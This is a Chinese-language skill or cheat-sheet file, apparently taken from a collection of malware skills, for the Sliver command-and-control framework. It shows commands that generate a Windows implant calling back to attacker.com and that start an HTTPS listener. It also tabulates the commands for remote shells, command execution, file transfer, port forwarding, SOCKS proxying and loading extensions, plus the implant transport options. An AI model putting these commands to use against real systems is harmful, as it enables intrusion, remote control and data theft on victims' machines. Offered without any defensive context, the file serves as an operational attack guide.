---
name: "sliver"
description: ">"
---

# Sliver

*Sourced from killvxk-malskills-zh*

# Sliver

开源 C2 框架：支持 mTLS、WireGuard、HTTP/S、DNS。

## 快速开始

```bash
./sliver-server
./sliver-client

generate --http https://attacker.com --os windows --arch amd64 --save implant.exe
https -l 443 -d attacker.com
use <session-id>
```

## 核心命令

| 命令 | 用途 |
|------|------|
| `generate` | 构建新植入程序 |
| `generate beacon` | 带签入间隔的异步 beacon |
| `jobs` | 列出活跃监听器 |
| `sessions` | 列出活跃会话 |
| `use <id>` | 与会话交互 |
| `shell` | 生成交互式 shell |
| `execute <cmd>` | 执行命令 |
| `download / upload` | 文件传输 |
| `portfwd add` | 端口转发 |
| `socks5 start` | 通过会话建立 SOCKS5 代理 |
| `armory` | 安装 BOF/扩展包 |

## 传输选项

| 传输方式 | 参数 |
|---------|------|
| mTLS | `--mtls <host>:<port>` |
| HTTP/S | `--http <url>` |
| WireGuard | `--wg <host>:<port>` |
| DNS | `--dns <domain>` |

## 资源文件

| 文件 | 加载时机 |
|------|----------|
| `references/` | BOF 执行、多人协作配置、OPSEC 说明 |

